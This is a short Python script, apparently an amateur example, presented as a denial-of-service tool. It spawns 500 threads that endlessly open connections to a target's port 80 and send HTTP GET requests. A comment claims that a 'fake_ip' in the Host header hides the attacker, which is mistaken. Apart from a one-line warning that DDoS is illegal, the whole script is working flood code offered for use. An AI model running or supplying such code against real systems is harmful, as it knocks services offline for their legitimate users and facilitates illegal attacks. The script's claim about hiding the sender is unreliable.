#Distributed Denial of Service
#The platform may not work for it's intended users

#Python doesnt support real time multi threading but can simulate it
import threading
import socket

target = "x.x.x.x" #Take down your server only as ddos is illegal!
port = 80 #Attack on port 80 will take down web services (http)
fake_ip = "168.172.34.2" #To hide youself (unreliable) 

#Define a method to run 
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #address family and socket type
        try:
            s.connect((target,port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()
        except:
            print("Failed")
            
for i in range(500):
    thread = threading.Thread(target= attack)
    thread.start()
